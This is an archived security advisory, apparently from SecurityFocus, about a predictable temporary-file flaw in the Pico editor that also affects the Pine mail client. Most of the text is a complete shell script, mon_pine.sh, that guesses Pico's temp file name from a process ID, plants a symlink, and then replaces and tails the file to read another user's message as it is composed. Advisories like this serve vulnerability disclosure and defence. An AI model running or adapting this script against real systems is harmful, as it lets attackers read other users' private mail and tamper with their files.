source: http://www.securityfocus.com/bid/2097/info

A vulnerability exists in several versions of University of Washington's Pico, a widely-distributed text editor shipped with most versions of Linux / Unix.

Under very specific circumstances, it is possible to cause this version of Pico to overwrite arbitrary files with the privilege level of the victim user.

As a result, if the attacker is able to correctly predict the name of the editor's temporary file, the current contents of the editor can be written to key system files or other data to which the user has write privileges. Depending on the user's privilege level, this could have a range of negative impacts on the host's security and operation.

Versions 3.8 and 4.3 of Pico have been confirmed vulnerable. Other versions are likely affected as well.

Note that, because the popular mail client Pine uses Pico as its editor, Pine is also vulnerable to this issue.

--------------------mon_pine.sh start--------------------------------
#!/bin/sh
# Grab local pine messages
# Usage: ./mon_pine.sh <pid of pine process>
# victim pine must use following settings
#
#  mat@hacksware.com
#  http://hacksware.com
#
# [x]  enable-alternate-editor-cmd
# [x]  enable-alternate-editor-implicitly
# editor                   = /usr/bin/vi
#

PID=$1
PICO_FILE=`printf "/tmp/pico.%.6d" $PID`
TRASHCAN=/tmp/.trashcan.`date|sed "s/ //g"`
echo PICO_FILE is $PICO_FILE

#if $PICO_FILE and $TRASHCAN exists, remove them
if test -f $PICO_FILE
then
 rm -f $PICO_FILE
fi
if test -f $TRASHCAN
then
 rm -f $TRASHCAN
fi

ln -s $TRASHCAN $PICO_FILE
while :
do
 if test -f $TRASHCAN
 then
  break
 fi
done

echo Victim is Editing Pine Message
rm -f $PICO_FILE
echo We replace temporary file
touch $PICO_FILE
chmod 777 $PICO_FILE
echo "Get the message from "$PICO_FILE
echo "^C to break tailer"
tail -f $PICO_FILE
--------------------mon_pine.sh end  --------------------------------
